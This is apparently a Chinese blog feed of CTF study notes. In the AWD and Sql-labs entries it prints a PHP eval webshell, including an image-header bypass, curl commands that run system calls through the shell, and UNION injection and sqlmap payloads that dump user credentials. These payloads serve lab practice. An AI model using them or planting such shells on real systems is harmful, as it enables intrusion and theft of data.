    <url>/2023/08/13/ctf/unsupported/%E3%80%90awd%E3%80%91%E5%B7%A5%E5%85%B7%E5%8F%8A%E6%96%B9%E6%B3%95%E8%AE%B0%E5%BD%95/</url>
    
    <content type="html"><![CDATA[<p>找ip  提前写好脚本，跑脚本</p><p>nmap扫了一下地址，发现http有几个是admin，看了相关文件夹，还有一个git</p><p>怎么加固？<br>得拖到本地审计</p><p>直接在管理员后台关掉了 在管理员页面直接关了</p><p>数据库<br>配置文件 cms 123456 mysql_config.php<br>config.php</p><h1 id="awd-3"><a href="#awd-3" class="headerlink" title="awd 3"></a>awd 3</h1><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dns"># nmap -v -<span class="hljs-keyword">A</span> <span class="hljs-number">192.168.20.201</span><br></code></pre></td></tr></table></figure><h1 id="日常记录"><a href="#日常记录" class="headerlink" title="日常记录"></a>日常记录</h1><h2 id="hackbar执行windows下的密码函数，post数据传递"><a href="#hackbar执行windows下的密码函数，post数据传递" class="headerlink" title="hackbar执行windows下的密码函数，post数据传递"></a>hackbar执行windows下的密码函数，post数据传递</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment"># 木马函数</span><br><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]) <span class="hljs-meta">?&gt;</span><br><br><span class="hljs-comment"># hackbar利用函数 windows</span><br>cmd=<span class="hljs-title function_ invoke__">system</span>(dir);<br>cmd=<span class="hljs-title function_ invoke__">system</span>(ipconfig);<br><br><span class="hljs-comment"># hackbar利用函数 linux</span><br>cmd=<span class="hljs-title function_ invoke__">system</span>(ls);<br>cmd=<span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;ls -l&quot;</span>);<br>cmd=<span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;cat /flag&quot;</span>);<br><span class="hljs-comment"># curl利用</span><br>curl http:<span class="hljs-comment">//xxx/admin/images/yjh.php -XPOST -H &#x27;Content-type: application/x-www-form-urlencoded&#x27; -d&quot;123=system(&#x27;cat /flag&#x27;);&quot;</span><br><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment"># 木马函数</span><br>GIF89a<span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]) <span class="hljs-meta">?&gt;</span><br><br>直接利用就可以<br></code></pre></td></tr></table></figure><h2 id="字符转换"><a href="#字符转换" class="headerlink" title="字符转换"></a>字符转换</h2><p>crlf -&gt; lf</p><h2 id="找组委会"><a href="#找组委会" class="headerlink" title="找组委会"></a>找组委会</h2><p>php能不能重启<br>watchbird能不能用</p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
      <category>unsupported</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>【虚拟机】(202308) hyperv中的kali虚拟机双网卡设置</title>
    <link href="/2023/08/13/net/%E3%80%90%E8%99%9A%E6%8B%9F%E6%9C%BA%E3%80%91(202308)%20hyperv%E4%B8%AD%E7%9A%84kali%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%8F%8C%E7%BD%91%E5%8D%A1%E8%AE%BE%E7%BD%AE/"/>
    <url>/2023/08/13/net/%E3%80%90%E8%99%9A%E6%8B%9F%E6%9C%BA%E3%80%91(202308)%20hyperv%E4%B8%AD%E7%9A%84kali%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%8F%8C%E7%BD%91%E5%8D%A1%E8%AE%BE%E7%BD%AE/</url>
    
    <content type="html"><![CDATA[<h2 id="场景"><a href="#场景" class="headerlink" title="场景"></a>场景</h2><p>hyperv创建虚拟机的时候，默认用的是default switch，这个default switch生成的ipv4地址是变化的</p><h2 id="需求"><a href="#需求" class="headerlink" title="需求"></a>需求</h2><p>有一个不变的ipv4地址，方便ssh远程连接</p><p>同时还可以连接外网</p><h2 id="操作"><a href="#操作" class="headerlink" title="操作"></a>操作</h2><h3 id="虚拟机新加网络适配器"><a href="#虚拟机新加网络适配器" class="headerlink" title="虚拟机新加网络适配器"></a>虚拟机新加网络适配器</h3><p>在hyperv中添加一块内部网卡，取名为kali</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230813180608.png" alt="image.png"></p><p>在kali的虚拟机中添加一个网络适配器，使用刚刚创建的kali</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230813180523.png" alt="image.png"></p><h3 id="主机网卡配置"><a href="#主机网卡配置" class="headerlink" title="主机网卡配置"></a>主机网卡配置</h3><p>default switch不做任何更改，使用默认配置，如下：<br><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230813180935.png" alt="image.png"></p><p>新建的内部网卡，配置为自定义的东西<br><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230813180854.png" alt="image.png"></p><h3 id="虚拟机网卡配置"><a href="#虚拟机网卡配置" class="headerlink" title="虚拟机网卡配置"></a>虚拟机网卡配置</h3><p>配置前：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~]<br>└─<span class="hljs-comment"># ip a</span><br>1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000<br>    <span class="hljs-built_in">link</span>/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00<br>    inet 127.0.0.1/8 scope host lo<br>       valid_lft forever preferred_lft forever<br>    inet6 ::1/128 scope host<br>       valid_lft forever preferred_lft forever<br>2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc mq state UP group default qlen 1000<br>    <span class="hljs-built_in">link</span>/ether 00:15:5d:38:01:18 brd ff:ff:ff:ff:ff:ff<br>    inet 172.20.18.191/20 brd 172.20.31.255 scope global dynamic noprefixroute eth0<br>       valid_lft 66803sec preferred_lft 66803sec<br>    inet6 fe80::ab0d:697e:3a89:841/64 scope <span class="hljs-built_in">link</span> noprefixroute<br>       valid_lft forever preferred_lft forever<br>3: eth1: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc mq state UP group default qlen 1000<br>    <span class="hljs-built_in">link</span>/ether 00:15:5d:38:01:1a brd ff:ff:ff:ff:ff:ff<br>    inet6 fe80::dab4:f432:f0bf:3a14/64 scope <span class="hljs-built_in">link</span> noprefixroute<br>       valid_lft forever preferred_lft forever<br><br></code></pre></td></tr></table></figure><p>修改网卡配置，添加eth1相关配置，并重启网络组件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~]<br>└─<span class="hljs-comment"># cat /etc/network/interfaces</span><br><span class="hljs-comment"># This file describes the network interfaces available on your system</span><br><span class="hljs-comment"># and how to activate them. For more information, see interfaces(5).</span><br><br><span class="hljs-built_in">source</span> /etc/network/interfaces.d/*<br><br><span class="hljs-comment"># The loopback network interface</span><br>auto lo<br>iface lo inet loopback<br><br>auto eth1<br>iface eth1 inet static<br>address 192.168.20.202<br>netmask 255.255.255.0<br><br>┌──(root㉿kali)-[~]<br>└─<span class="hljs-comment"># service networking restart</span><br><br><br></code></pre></td></tr></table></figure><p>可以看到eth1下面已经有了ip地址</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~]<br>└─<span class="hljs-comment"># ip a</span><br>1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000<br>    <span class="hljs-built_in">link</span>/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00<br>    inet 127.0.0.1/8 scope host lo<br>       valid_lft forever preferred_lft forever<br>    inet6 ::1/128 scope host<br>       valid_lft forever preferred_lft forever<br>2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc mq state UP group default qlen 1000<br>    <span class="hljs-built_in">link</span>/ether 00:15:5d:38:01:18 brd ff:ff:ff:ff:ff:ff<br>    inet 172.20.18.191/20 brd 172.20.31.255 scope global dynamic noprefixroute eth0<br>       valid_lft 66549sec preferred_lft 66549sec<br>    inet6 fe80::ab0d:697e:3a89:841/64 scope <span class="hljs-built_in">link</span> noprefixroute<br>       valid_lft forever preferred_lft forever<br>3: eth1: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc mq state UP group default qlen 1000<br>    <span class="hljs-built_in">link</span>/ether 00:15:5d:38:01:1a brd ff:ff:ff:ff:ff:ff<br>    inet 192.168.20.202/24 brd 192.168.20.255 scope global eth1<br>       valid_lft forever preferred_lft forever<br><br><br></code></pre></td></tr></table></figure><p>看下路由表，此时默认路由是从eth0网卡走的<br>ping 百度也是可以ping通的 说明网络没有问题</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~]<br>└─<span class="hljs-comment"># route -n</span><br>Kernel IP routing table<br>Destination     Gateway         Genmask         Flags Metric Ref    Use Iface<br>0.0.0.0         172.20.16.1     0.0.0.0         UG    101    0        0 eth0<br>172.20.16.0     0.0.0.0         255.255.240.0   U     101    0        0 eth0<br>192.168.20.0    0.0.0.0         255.255.255.0   U     0      0        0 eth1<br><br>┌──(root㉿kali)-[~]<br>└─<span class="hljs-comment"># ping www.baidu.com</span><br>PING www.a.shifen.com (39.156.66.14) 56(84) bytes of data.<br>64 bytes from 39.156.66.14 (39.156.66.14): icmp_seq=1 ttl=51 time=6.01 ms<br>64 bytes from 39.156.66.14 (39.156.66.14): icmp_seq=2 ttl=51 time=5.59 ms<br>64 bytes from 39.156.66.14 (39.156.66.14): icmp_seq=3 ttl=51 time=5.67 ms<br>^C64 bytes from 39.156.66.14: icmp_seq=4 ttl=51 time=5.72 ms<br><br>--- www.a.shifen.com ping statistics ---<br>4 packets transmitted, 4 received, 0% packet loss, time 3082ms<br>rtt min/avg/max/mdev = 5.588/5.744/6.006/0.157 ms<br><br>┌──(root㉿kali)-[~]<br>└─<span class="hljs-comment">#</span><br><br></code></pre></td></tr></table></figure><p>重启虚拟机后，添加的静态网卡ip地址是不变的，同样可以根据这个ip地址进行远程连接，就不需要每次都换ip了~</p><h3 id="问题说明"><a href="#问题说明" class="headerlink" title="问题说明"></a>问题说明</h3><p>如果路由表里面有两条默认路由，此时ping百度ping不通<br>可以通过修改网卡配置，删除gateway相关内容， 并重启网络来解决</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ route -n<br>Kernel IP routing table<br>Destination     Gateway         Genmask         Flags Metric Ref    Use Iface<br>0.0.0.0         192.168.20.1    0.0.0.0         UG    0      0        0 eth1<br>0.0.0.0         172.20.16.1     0.0.0.0         UG    101    0        0 eth0<br>172.20.16.0     0.0.0.0         255.255.240.0   U     101    0        0 eth0<br>192.168.20.0    0.0.0.0         255.255.255.0   U     0      0        0 eth1<br><br><br><br>┌──(kali㉿kali)-[~]<br>└─$ ping www.baidu.com<br>PING www.a.shifen.com (39.156.66.18) 56(84) bytes of data.<br>From 192.168.20.202 (192.168.20.202) icmp_seq=1 Destination Host Unreachable<br>From 192.168.20.202 (192.168.20.202) icmp_seq=2 Destination Host Unreachable<br>From 192.168.20.202 (192.168.20.202) icmp_seq=3 Destination Host Unreachable<br>^C<br>--- www.a.shifen.com ping statistics ---<br>4 packets transmitted, 0 received, +3 errors, 100% packet loss, time 6153ms<br>pipe 4<br><br>┌──(kali㉿kali)-[~]<br>└─$<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>net</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>【ctf系列】metasploit</title>
    <link href="/2023/08/12/ctf/unsupported/%E3%80%90ctf%E7%B3%BB%E5%88%97%E3%80%91metasploit/"/>
    <url>/2023/08/12/ctf/unsupported/%E3%80%90ctf%E7%B3%BB%E5%88%97%E3%80%91metasploit/</url>
    
    <content type="html"><![CDATA[<p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230812211411.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230812211639.png" alt="image.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">show exploits<br><br>info<br>back<br><br>search ms17<br>search <span class="hljs-built_in">type</span>:auxiliary name:ms17<br>search <span class="hljs-built_in">type</span>:exploit name:ms17<br>search <span class="hljs-built_in">type</span>:payload<br><br><span class="hljs-built_in">set</span> rhosts x.x.x.x<br></code></pre></td></tr></table></figure><p>445端口<br>smb协议</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">whois<br></code></pre></td></tr></table></figure><p>密码生成器：genpAss</p><p>phpmyadmin 4.8.1后台getshell</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230812234818.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230812235037.png" alt="image.png"></p><p>msfconsole</p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
      <category>unsupported</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>【ctf系列】XSS</title>
    <link href="/2023/08/08/ctf/unsupported/%E3%80%90ctf%E7%B3%BB%E5%88%97%E3%80%91XSS/"/>
    <url>/2023/08/08/ctf/unsupported/%E3%80%90ctf%E7%B3%BB%E5%88%97%E3%80%91XSS/</url>
    
    <content type="html"><![CDATA[<p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230808205604.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230808211215.png" alt="image.png"></p><p>Burpsuite：<br>Encoder  将一个url变成url的编码方式<br>Render 渲染</p><p>window.location 重定向</p><p>nc -vnlp 80 监听80端口</p><h1 id="writeup-2"><a href="#writeup-2" class="headerlink" title="writeup 2"></a>writeup 2</h1><p><a href="https://www.charseki.com/archives/xss-test-platform">XSS Test Platform</a></p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
      <category>unsupported</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>【ctf系列】常用术语</title>
    <link href="/2023/08/08/ctf/unsupported/%E3%80%90ctf%E7%B3%BB%E5%88%97%E3%80%91%E5%B8%B8%E7%94%A8%E6%9C%AF%E8%AF%AD/"/>
    <url>/2023/08/08/ctf/unsupported/%E3%80%90ctf%E7%B3%BB%E5%88%97%E3%80%91%E5%B8%B8%E7%94%A8%E6%9C%AF%E8%AF%AD/</url>
    
    <content type="html"><![CDATA[<p>PoC<br>shellcode</p><p>exploit：用于攻击的脚本与方案<br>payload：攻击载荷，是的目标进程被劫持控制流的数据<br>shellcode：调用攻击目标的shell的代码</p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
      <category>unsupported</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>【ctf系列】Sql-labs 第02关：GET -Error based -Integer based</title>
    <link href="/2023/08/08/ctf/%E3%80%90ctf%E7%B3%BB%E5%88%97%E3%80%91Sql-labs%20%E7%AC%AC02%E5%85%B3%EF%BC%9AGET%20-Error%20based%20-Integer%20based/"/>
    <url>/2023/08/08/ctf/%E3%80%90ctf%E7%B3%BB%E5%88%97%E3%80%91Sql-labs%20%E7%AC%AC02%E5%85%B3%EF%BC%9AGET%20-Error%20based%20-Integer%20based/</url>
    
    <content type="html"><![CDATA[<h1 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h1><h2 id="方法1：手工注入"><a href="#方法1：手工注入" class="headerlink" title="方法1：手工注入"></a>方法1：手工注入</h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>x.x.x.x:x<span class="hljs-regexp">/Less-2/</span>?id=<span class="hljs-number">1</span><br>http:<span class="hljs-regexp">//</span>x.x.x.x:x<span class="hljs-regexp">/Less-2/</span>?id=<span class="hljs-number">2</span><br><br>http:<span class="hljs-regexp">//</span>x.x.x.x:x<span class="hljs-regexp">/Less-2/</span>?id=<span class="hljs-number">1</span> and <span class="hljs-number">1</span>=<span class="hljs-number">1</span><br>http:<span class="hljs-regexp">//</span>x.x.x.x:x<span class="hljs-regexp">/Less-2/</span>?id=<span class="hljs-number">1</span> and <span class="hljs-number">1</span>=<span class="hljs-number">2</span><br><br>http:<span class="hljs-regexp">//</span>x.x.x.x:x<span class="hljs-regexp">/Less-2/</span>?id=<span class="hljs-number">1</span> order by <span class="hljs-number">1</span> <br>http:<span class="hljs-regexp">//</span>x.x.x.x:x<span class="hljs-regexp">/Less-2/</span>?id=<span class="hljs-number">1</span> order by <span class="hljs-number">3</span> <br>http:<span class="hljs-regexp">//</span>x.x.x.x:x<span class="hljs-regexp">/Less-2/</span>?id=<span class="hljs-number">1</span> order by <span class="hljs-number">4</span><br><br>http:<span class="hljs-regexp">//</span>x.x.x.x:x<span class="hljs-regexp">/Less-2/</span>?id=-<span class="hljs-number">1</span> union select <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span><br>http:<span class="hljs-regexp">//</span>x.x.x.x:x<span class="hljs-regexp">/Less-2/</span>?id=-<span class="hljs-number">1</span> union select <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,database()<br>http:<span class="hljs-regexp">//</span>x.x.x.x:x<span class="hljs-regexp">/Less-2/</span>?id=-<span class="hljs-number">1</span> union select <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(table_name) from information_schema.tables<br>http:<span class="hljs-regexp">//</span>x.x.x.x:x<span class="hljs-regexp">/Less-2/</span>?id=-<span class="hljs-number">1</span> union select <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(table_name) from information_schema.tables where table_schema=<span class="hljs-string">&#x27;security&#x27;</span><br>http:<span class="hljs-regexp">//</span>x.x.x.x:x<span class="hljs-regexp">/Less-2/</span>?id=-<span class="hljs-number">1</span> union select <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(column_name) from information_schema.columns where table_schema=<span class="hljs-string">&#x27;security&#x27;</span> and table_name=<span class="hljs-string">&#x27;users&#x27;</span><br>http:<span class="hljs-regexp">//</span>x.x.x.x:x<span class="hljs-regexp">/Less-2/</span>?id=-<span class="hljs-number">1</span> union select <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(username,<span class="hljs-number">0</span>x3a,password) from users<br><br></code></pre></td></tr></table></figure><h2 id="方法2：sqlmap工具-同第01关"><a href="#方法2：sqlmap工具-同第01关" class="headerlink" title="方法2：sqlmap工具 同第01关"></a>方法2：sqlmap工具 同第01关</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlmap -u http://x.x.x.x:x/Less-1/?<span class="hljs-built_in">id</span>=1 --dbs<br>sqlmap -u http://x.x.x.x:x/Less-1/?<span class="hljs-built_in">id</span>=1 -D security --tables<br>sqlmap -u http://x.x.x.x:x/Less-1/?<span class="hljs-built_in">id</span>=1 -D security -T <span class="hljs-built_in">users</span> --columns<br>sqlmap -u http://x.x.x.x:x/Less-1/?<span class="hljs-built_in">id</span>=1 -D security -T <span class="hljs-built_in">users</span> -C password,<span class="hljs-built_in">id</span>,username --dump<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>【kali】kali中安装w3af</title>
    <link href="/2023/08/08/ctf/%E3%80%90kali%E3%80%91kali%E4%B8%AD%E5%AE%89%E8%A3%85w3af/"/>
    <url>/2023/08/08/ctf/%E3%80%90kali%E3%80%91kali%E4%B8%AD%E5%AE%89%E8%A3%85w3af/</url>
    
    <content type="html"><![CDATA[<p>将默认的python指向python2</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl https://bootstrap.pypa.io/pip/2.7/get-pip.py -o get-pip.py<br>python get-pip.py<br><br></code></pre></td></tr></table></figure><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p>安装pip：<a href="https://stackoverflow.com/questions/64187581/e-package-python-pip-has-no-installation-candidate">https://stackoverflow.com/questions/64187581/e-package-python-pip-has-no-installation-candidate</a><br>修改默认python：<a href="https://blog.csdn.net/Romance5201314/article/details/81667778">https://blog.csdn.net/Romance5201314/article/details/81667778</a>   </p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>【kali】kali中安装w3af</title>
    <link href="/2023/08/08/ctf/unsupported/%E3%80%90kali%E3%80%91kali%E4%B8%AD%E5%AE%89%E8%A3%85w3af/"/>
    <url>/2023/08/08/ctf/unsupported/%E3%80%90kali%E3%80%91kali%E4%B8%AD%E5%AE%89%E8%A3%85w3af/</url>
    
    <content type="html"><![CDATA[<p>将默认的python指向python2</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl https://bootstrap.pypa.io/pip/2.7/get-pip.py -o get-pip.py<br>python get-pip.py<br><br></code></pre></td></tr></table></figure><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p>安装pip：<a href="https://stackoverflow.com/questions/64187581/e-package-python-pip-has-no-installation-candidate">https://stackoverflow.com/questions/64187581/e-package-python-pip-has-no-installation-candidate</a><br>修改默认python：<a href="https://blog.csdn.net/Romance5201314/article/details/81667778">https://blog.csdn.net/Romance5201314/article/details/81667778</a>   </p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
      <category>unsupported</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>【ctf系列】Sql-labs 第01关：GET -Error based -Single quotes -String</title>
    <link href="/2023/08/08/ctf/%E3%80%90ctf%E7%B3%BB%E5%88%97%E3%80%91Sql-labs%20%E7%AC%AC01%E5%85%B3%EF%BC%9AGET%20-Error%20based%20-Single%20quotes%20-String/"/>
    <url>/2023/08/08/ctf/%E3%80%90ctf%E7%B3%BB%E5%88%97%E3%80%91Sql-labs%20%E7%AC%AC01%E5%85%B3%EF%BC%9AGET%20-Error%20based%20-Single%20quotes%20-String/</url>
    
    <content type="html"><![CDATA[<h1 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h1><h2 id="方法1：手工注入"><a href="#方法1：手工注入" class="headerlink" title="方法1：手工注入"></a>方法1：手工注入</h2><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://x.x.x.x:x/Less-<span class="hljs-number">1</span>/?id=<span class="hljs-number">1</span><br><span class="hljs-attribute">http</span>://x.x.x.x:x/Less-<span class="hljs-number">1</span>/?id=<span class="hljs-number">2</span><br><span class="hljs-attribute">http</span>://x.x.x.x:x/Less-<span class="hljs-number">1</span>/?id=<span class="hljs-number">3</span><br><br><span class="hljs-attribute">http</span>://x.x.x.x:x/Less-<span class="hljs-number">1</span>/?id=<span class="hljs-number">1</span> and <span class="hljs-number">1</span>=<span class="hljs-number">1</span><br><span class="hljs-attribute">http</span>://x.x.x.x:x/Less-<span class="hljs-number">1</span>/?id=<span class="hljs-number">1</span> and <span class="hljs-number">1</span>=<span class="hljs-number">2</span><br><br><span class="hljs-attribute">http</span>://x.x.x.x:x/Less-<span class="hljs-number">1</span>/?id=<span class="hljs-number">1</span>&#x27;<br><br><span class="hljs-attribute">http</span>://x.x.x.x:x/Less-<span class="hljs-number">1</span>/?id=<span class="hljs-number">1</span>&#x27; --<br><span class="hljs-attribute">http</span>://x.x.x.x:x/Less-<span class="hljs-number">1</span>/?id=<span class="hljs-number">1</span>&#x27; --+<br><br><span class="hljs-comment"># 确定表中的列数</span><br><span class="hljs-attribute">http</span>://x.x.x.x:x/Less-<span class="hljs-number">1</span>/?id=<span class="hljs-number">1</span>&#x27; order by <span class="hljs-number">1</span> --+<br><span class="hljs-attribute">http</span>://x.x.x.x:x/Less-<span class="hljs-number">1</span>/?id=<span class="hljs-number">1</span>&#x27; order by <span class="hljs-number">3</span> --+<br><span class="hljs-attribute">http</span>://x.x.x.x:x/Less-<span class="hljs-number">1</span>/?id=<span class="hljs-number">1</span>&#x27; order by <span class="hljs-number">4</span> --+<br><br><span class="hljs-attribute">http</span>://x.x.x.x:x/Less-<span class="hljs-number">1</span>/?id=-<span class="hljs-number">1</span>&#x27; union select <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span> --+<br><span class="hljs-attribute">http</span>://x.x.x.x:x/Less-<span class="hljs-number">1</span>/?id=-<span class="hljs-number">1</span>&#x27; union select <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,database() --+<br><span class="hljs-attribute">http</span>://x.x.x.x:x/Less-<span class="hljs-number">1</span>/?id=-<span class="hljs-number">1</span>&#x27; union select <span class="hljs-number">1</span>,group_concat(table_name),<span class="hljs-number">3</span> from information_schema.tables --+<br><span class="hljs-attribute">http</span>://x.x.x.x:x/Less-<span 